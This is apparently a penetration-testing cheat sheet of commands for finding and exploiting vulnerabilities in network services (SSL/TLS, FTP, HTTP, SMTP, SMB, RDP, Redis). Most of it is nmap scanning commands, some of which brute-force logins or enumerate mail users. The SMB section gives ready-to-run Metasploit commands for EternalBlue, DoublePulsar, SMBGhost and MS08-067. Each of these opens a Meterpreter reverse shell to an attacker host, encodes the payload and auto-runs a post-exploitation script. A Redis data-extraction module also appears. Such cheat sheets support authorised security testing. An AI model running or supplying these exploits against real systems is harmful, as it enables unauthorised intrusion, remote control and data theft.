# Asset Vulnerability Enumeration

## Cheat Sheet

### SSL/TLS

#### [Nmap](https://nmap.org/)

{% hint style="info" %}
Enumerate SSL ciphers
{% endhint %}

```bash
nmap --mtu 5000 \
--script ssl-enum-ciphers \
-p 443 $TARGET
```

{% hint style="info" %}
Enumerate SSL vulnerabilities
{% endhint %}

```bash
nmap --mtu 5000 \
--script=ssl-ccs-injection.nse,ssl-heartbleed.nse,ssl-known-key.nse,ssl-poodle.nse,sslv2-drown.nse \
-p 443 $TARGET
```

#### [testssl.sh](https://github.com/testssl/testssl.sh)

{% hint style="info" %}
Test SSL/TLS vulnerabilities on a single host
{% endhint %}

```bash
testssl $TARGET
```

{% hint style="info" %}
Test SSL/TLS vulnerabilities on a Subnet
{% endhint %}

```bash
testssl 192.168.1.0/24
```

{% hint style="info" %}
Test SSL/TLS server implementation bugs
{% endhint %}

```bash
testssl --full $TARGET
```

### FTP

#### [Nmap](https://nmap.org/)

{% hint style="info" %}
Detect ftp vulnerabilities
{% endhint %}

```bash
nmap -sS -sV --mtu 5000 \
--script=ftp-anon,ftp-brute,ftp-vuln-cve2010-4221.nse,ftp-vsftpd-backdoor.nse,ftp-proftpd-backdoor.nse \
-p 21 $TARGET
```

### HTTP

#### [Nmap](https://nmap.org/)

{% hint style="info" %}
Detect http service vulnerabilities
{% endhint %}

```bash
nmap -sS -sV --mtu 5000 \
--script=http-vuln-*,http-huawei-hg5xx-vuln.nse,http-iis-webdav-vuln.nse,http-vmware-path-vuln.nse,mysql-vuln-cve2012-2122.nse \
-p 80 $TARGET
```

### SMTP

#### [Nmap](https://nmap.org/)

{% hint style="info" %}
Detect smtp vulnerabilities
{% endhint %}

```bash
nmap -sS -sV --mtu 5000 \
--script=smtp-vuln-*,smtp-open-relay,smtp-brute \
-p 25,465,587 $TARGET
```

{% hint style="info" %}
Enumerate SMTP server users
{% endhint %}

```bash
nmap --script smtp-enum-users.nse \
--script-args=smtp-enum-users.methods={EXPN,RCPT,VRFY} \
-p 25,465,587 $TARGET
```

### SMB

#### [Nmap](https://nmap.org/)

{% hint style="info" %}
Detect smb vulnerabilities
{% endhint %}

```bash
nmap -sS -sV --mtu 5000 \
--script=smb2-vuln-*,smb-vuln-*,samba-vuln-cve-2012-1182.nse,smb-double-pulsar-backdoor \
-p 139,445 $TARGET
```

#### [Metasploit](https://github.com/rapid7/metasploit-framework)

{% hint style="info" %}
EternalBlue Exploit (ٌWin 7 to 10 - Win Server 2008 to 2012)
{% endhint %}

```bash
msfconsole -qx "
    use exploit/windows/smb/ms17_010_eternalblue;
    set PAYLOAD windows/x64/meterpreter/reverse_https;
    set RHOSTS $TARGET;
    set LHOST $NGHOST;
    set LPORT 443;
    set ReverseListenerBindAddress 127.0.0.1;
    set ReverseListenerBindPort 4444;
    set HandlerSSLCert $CERT;
    set StagerVerifySSLCert true;
    set StageEncoder true;
    set AutoRunScript /tmp/post-exp.rc;
    run -j"
```

{% hint style="info" %}
Doublepulsar Exploit (ٌWin 7 to 10 - Win Server 2008 to 2012)
{% endhint %}

```bash
msfconsole -qx "
    use exploit/windows/smb/smb_doublepulsar_rce;
    set PAYLOAD windows/x64/meterpreter/reverse_https;
    set RHOSTS $TARGET;
    set LHOST $NGHOST;
    set LPORT 443;
    set ReverseListenerBindAddress 127.0.0.1;
    set ReverseListenerBindPort 4444;
    set HandlerSSLCert $CERT;
    set StagerVerifySSLCert true;
    set StageEncoder true;
    set AutoRunScript /tmp/post-exp.rc;
    run -j"
```

{% hint style="info" %}
SMBGhost Exploit (Win 10)
{% endhint %}

```bash
msfconsole -qx "
    use exploit/windows/smb/cve_2020_0796_smbghost;
    set PAYLOAD windows/x64/meterpreter/reverse_https;
    set RHOSTS $TARGET;
    set LHOST $NGHOST;
    set LPORT 443;
    set ReverseListenerBindAddress 127.0.0.1;
    set ReverseListenerBindPort 4444;
    set HandlerSSLCert $CERT;
    set StagerVerifySSLCert true;
    set StageEncoder true;
    set AutoRunScript /tmp/post-exp.rc;
    run -j"
```

{% hint style="info" %}
Net API Exploit (Win XP's)
{% endhint %}

```bash
msfconsole -qx "
    use exploit/windows/smb/ms08_067_netapi;
    set PAYLOAD windows/meterpreter/reverse_hop_http;
    set RHOSTS $TARGET;
    set LHOST $NGHOST;
    set LPORT 443;
    set ReverseListenerBindAddress 127.0.0.1;
    set ReverseListenerBindPort 4444;
    set HandlerSSLCert $CERT;
    set StagerVerifySSLCert true;
    set StageEncoder true;
    set AutoRunScript /tmp/post-exp.rc;
    run -j"
```

### RDP

#### [Nmap](https://nmap.org/)

{% hint style="info" %}
Detect RDP vulnerabilities
{% endhint %}

```bash
nmap -sS -sV --mtu 5000 \
--script=rdp-vuln-ms12-020.nse,rdp-ntlm-info.nse \
-p 3389 $TARGET
```

### Redis

#### [Nmap](https://nmap.org/)

{% hint style="info" %}
Detect Redis vulnerabilities
{% endhint %}

```bash
nmap -sS -sV --mtu 5000 \
--script=redis-info.nse \
-p 6379 $TARGET
```

#### [Metasploit](https://github.com/rapid7/metasploit-framework)

{% hint style="info" %}
Redis Misconfiguration Check
{% endhint %}

```bash
msfconsole -qx "use auxiliary/gather/redis_extractor;
    set RHOSTS $TARGET;
    run;
    exit"
```
